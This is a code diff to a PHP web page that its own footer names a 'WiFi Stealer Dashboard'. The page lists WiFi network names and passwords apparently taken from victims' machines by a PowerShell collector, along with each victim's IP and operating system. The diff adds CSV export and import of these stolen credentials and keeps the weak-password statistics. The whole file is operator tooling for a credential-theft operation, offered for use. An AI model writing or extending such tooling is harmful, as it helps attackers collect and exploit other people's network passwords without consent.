@@ -1,12 +1,116 @@
 <?php
 // WiFi credential logger dashboard
 // Single-file implementation (with safer parsing and real capture time)
+// + CSV export / import
 
 date_default_timezone_set('Asia/Kolkata');
 
 $logFile = __DIR__ . '/wifi_creds.log';
 
-// Clear all entries if requested
+// --- 1. CSV EXPORT: download all captures as CSV ---
+if (isset($_GET['action']) && $_GET['action'] === 'export_csv') {
+    if (!file_exists($logFile)) {
+        die('No data to export.');
+    }
+
+    $rawLines = file($logFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
+    if (empty($rawLines)) {
+        die('No captures to export.');
+    }
+
+    // Parse each line as CSV (Time, SSID, Pass, IP, OS)
+    $records = [];
+    foreach ($rawLines as $rawLine) {
+        $lines = preg_split('/\r\n|\r|\n/', $rawLine);
+        foreach ($lines as $line) {
+            $line = trim($line);
+            if ($line === '') continue;
+
+            // Skip header row
+            if (stripos($line, 'time') !== false && stripos($line, 'ssid') !== false
+                && stripos($line, 'pass') !== false && stripos($line, 'ip') !== false
+                && stripos($line, 'os') !== false) {
+                continue;
+            }
+
+            $fields = str_getcsv($line);
+            if (count($fields) < 5) continue;
+
+            $timeStr  = isset($fields[0]) ? trim($fields[0]) : '';
+            $ssid     = isset($fields[1]) ? trim($fields[1]) : '';
+            $pass     = isset($fields[2]) ? trim($fields[2]) : '';
+            $sourceIP = isset($fields[3]) ? trim($fields[3]) : '';
+            $sourceOS = isset($fields[4]) ? trim($fields[4]) : '';
+
+            $badSsids = ['profile_name', 'ssid', 'SSID', 'IP', 'OS', 'Pass', 'password'];
+            if ($ssid === '' || in_array($ssid, $badSsids, true) || in_array($pass, ['Pass', 'password'], true)) {
+                continue;
+            }
+
+            if ($pass === '') {
+                $pass = '(Not Found)';
+            }
+
+            $timestamp = $timeStr !== '' ? $timeStr : 'unknown';
+
+            $records[] = [
+                $timestamp,
+                $ssid,
+                $pass,
+                $sourceIP,
+                $sourceOS
+            ];
+        }
+    }
+
+    if (empty($records)) {
+        die('No valid captures to export.');
+    }
+
+    $filename = 'wifi_captures_' . date('Ymd_Hi') . '.csv';
+    header('Content-Type: text/csv; charset=utf-8');
+    header('Content-Disposition: attachment; filename="' . $filename . '"');
+    $fp = fopen('php://output', 'w');
+
+    fputcsv($fp, ['Time', 'SSID', 'Password', 'Attacker IP', 'OS']);
+
+    foreach ($records as $row) {
+        fputcsv($fp, $row);
+    }
+
+    fclose($fp);
+    exit;
+}
+
+// --- 2. CSV IMPORT: upload CSV and append to wifi_creds.log ---
+if (isset($_POST['action']) && $_POST['action'] === 'import_csv') {
+    if (!isset($_FILES['csv_file']) || $_FILES['csv_file']['error'] !== UPLOAD_ERR_OK) {
+        $importStatus = 'Error: No file uploaded or upload failed.';
+    } else {
+        $tmpName = $_FILES['csv_file']['tmp_name'];
+        if (!is_uploaded_file($tmpName)) {
+            $importStatus = 'Invalid upload.';
+        } else {
+            $fp = fopen($tmpName, 'r');
+            if (!$fp) {
+                $importStatus = 'Cannot read uploaded file.';
+            } else {
+                $addedCount = 0;
+                while (($fields = fgetcsv($fp, 0, ',', '"', '\\')) !== false) {
+                    if (count($fields) >= 5) {
+                        $line = '"' . implode('","', array_map('trim', $fields)) . '"' . PHP_EOL;
+                        file_put_contents($logFile, $line, FILE_APPEND | LOCK_EX);
+                        $addedCount++;
+                    }
+                }
+                fclose($fp);
+                $importStatus = "Imported $addedCount captures from CSV.";
+            }
+        }
+    }
+}
+
+// --- 3. Clear all entries if requested ---
 if (isset($_POST['action']) && $_POST['action'] === 'clear_all') {
     if (file_exists($logFile)) {
         $handle = fopen($logFile, 'w');
@@ -18,7 +122,7 @@ if (isset($_POST['action']) && $_POST['action'] === 'clear_all') {
     exit;
 }
 
-// Delete single entry
+// --- 4. Delete single entry ---
 if (isset($_POST['action']) && $_POST['action'] === 'delete_one') {
     $index = isset($_POST['idx']) ? intval($_POST['idx']) : -1;
 
@@ -33,7 +137,7 @@ if (isset($_POST['action']) && $_POST['action'] === 'delete_one') {
     exit;
 }
 
-// Simple OS detection from user agent string
+// --- 5. OS detection from user agent ---
 function detectOS($userAgent) {
     $ua = strtolower($userAgent);
 
@@ -52,13 +156,12 @@ $viewerIP = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
 $viewerUA = $_SERVER['HTTP_USER_AGENT'] ?? '';
 $viewerOS = detectOS($viewerUA);
 
-// Read the log file (each element may contain CSV text)
+// --- 6. Read log file (CSV) ---
 $rawLines = [];
 if (file_exists($logFile)) {
     $rawLines = file($logFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
 }
 
-// Initialize counters and arrays
 $totalCaptures = 0;
 $ssidCount = [];
 $ipCount = [];
@@ -66,60 +169,46 @@ $totalPasswordLength = 0;
 $weakPasswords = 0;
 $captureEntries = [];
 
-// Parse each line from the CSV log
-// CSV format from PowerShell: "Time","SSID","Pass","IP","OS"
+// --- 7. Parse CSV lines into captures ---
 foreach ($rawLines as $rawLine) {
-    // In case wifi-recv.php appended blocks, split into single lines
     $lines = preg_split('/\r\n|\r|\n/', $rawLine);
     foreach ($lines as $line) {
         $line = trim($line);
         if ($line === '') continue;
 
-        // Skip header row if present
-        if (stripos($line, 'time') !== false &&
-            stripos($line, 'ssid') !== false &&
-            stripos($line, 'pass') !== false &&
-            stripos($line, 'ip') !== false &&
-            stripos($line, 'os') !== false) {
+        // Skip header row
+        if (stripos($line, 'time') !== false && stripos($line, 'ssid') !== false
+            && stripos($line, 'pass') !== false && stripos($line, 'ip') !== false
+            && stripos($line, 'os') !== false) {
             continue;
         }
 
         $fields = str_getcsv($line);
         if (count($fields) < 5) continue;
 
-        // Extract fields safely (Time, SSID, Pass, IP, OS)
         $timeStr  = isset($fields[0]) ? trim($fields[0]) : '';
         $ssid     = isset($fields[1]) ? trim($fields[1]) : '';
         $pass     = isset($fields[2]) ? trim($fields[2]) : '';
         $sourceIP = isset($fields[3]) ? trim($fields[3]) : '';
         $sourceOS = isset($fields[4]) ? trim($fields[4]) : '';
 
-        // Hard filter: skip obvious header / garbage rows
         $badSsids = ['profile_name', 'ssid', 'SSID', 'IP', 'OS', 'Pass', 'password'];
-        if (
-            $ssid === '' ||
-            in_array($ssid, $badSsids, true) ||
-            in_array($pass, ['Pass', 'password'], true)
-        ) {
+        if ($ssid === '' || in_array($ssid, $badSsids, true) || in_array($pass, ['Pass', 'password'], true)) {
             continue;
         }
 
-        // Handle empty password (display it instead of filtering it out)
         if ($pass === '') {
             $pass = '(Not Found)';
         }
 
-        // Use capture time from CSV; fallback to "unknown"
         $timestamp = $timeStr !== '' ? $timeStr : 'unknown';
 
         $totalCaptures++;
 
-        // Track unique SSIDs
         if ($ssid !== '') {
             $ssidCount[$ssid] = isset($ssidCount[$ssid]) ? $ssidCount[$ssid] + 1 : 1;
         }
 
-        // Track source IPs
         if ($sourceIP !== '') {
             $ipCount[$sourceIP] = isset($ipCount[$sourceIP]) ? $ipCount[$sourceIP] + 1 : 1;
         }
@@ -127,7 +216,6 @@ foreach ($rawLines as $rawLine) {
         $passLength = strlen($pass);
         $totalPasswordLength += $passLength;
 
-        // Check password strength (basic)
         $allLetters   = ($pass !== '' && ctype_alpha($pass));
         $allNumbers   = ($pass !== '' && ctype_digit($pass));
         $weakPassword = ($passLength < 8 || $allLetters || $allNumbers);
@@ -154,7 +242,7 @@ $uniqueIPs       = count($ipCount);
 $avgPasswordLen  = $totalCaptures > 0 ? round($totalPasswordLength / $totalCaptures, 1) : 0;
 $weakPercentage  = $totalCaptures > 0 ? round(($weakPasswords / $totalCaptures) * 100, 1) : 0.0;
 
-// View mode selection
+// --- 8. View mode selection ---
 $viewMode = isset($_GET['view']) ? $_GET['view'] : 'full';
 $viewMode = ($viewMode === 'compact') ? 'compact' : 'full';
 ?>
@@ -406,6 +494,17 @@ $viewMode = ($viewMode === 'compact') ? 'compact' : 'full';
             </div>
         </div>
         <div class="actions">
+            <!-- Import CSV form -->
+            <form method="POST" enctype="multipart/form-data" style="display:inline;">
+                <input type="hidden" name="action" value="import_csv">
+                <label for="csv_file" style="font-size:0.9em;">Import CSV:</label>
+                <input type="file" name="csv_file" id="csv_file" accept=".csv" required style="margin:0 0.5em;">
+                <button type="submit" class="btn">Upload CSV</button>
+            </form>
+
+            <!-- Export CSV button -->
+            <a href="?action=export_csv" class="btn">Export to CSV</a>
+
             <!-- View mode switcher -->
             <a href="?view=full" class="btn btn-sm"
                style="text-decoration:none; <?php echo $viewMode === 'full' ? 'border-color:#4f46e5;' : ''; ?>">
@@ -435,6 +534,12 @@ $viewMode = ($viewMode === 'compact') ? 'compact' : 'full';
             </form>
         </div>
     </div>
+
+    <?php if (isset($importStatus)): ?>
+        <p style="font-size: 0.9em; color: #fecaca; margin: 4px 0;">
+            <?= htmlspecialchars($importStatus); ?>
+        </p>
+    <?php endif; ?>
 
     <!-- Statistics cards -->
     <div class="stats-grid">
@@ -546,7 +651,7 @@ $viewMode = ($viewMode === 'compact') ? 'compact' : 'full';
     </div>
 
     <div class="footer">
-        © 2026 WiFi Stealer Dashboard – made by narain
+        © 2026 WiFi Stealer Dashboard – made by Zypher17
     </div>
 </div>
 </body>
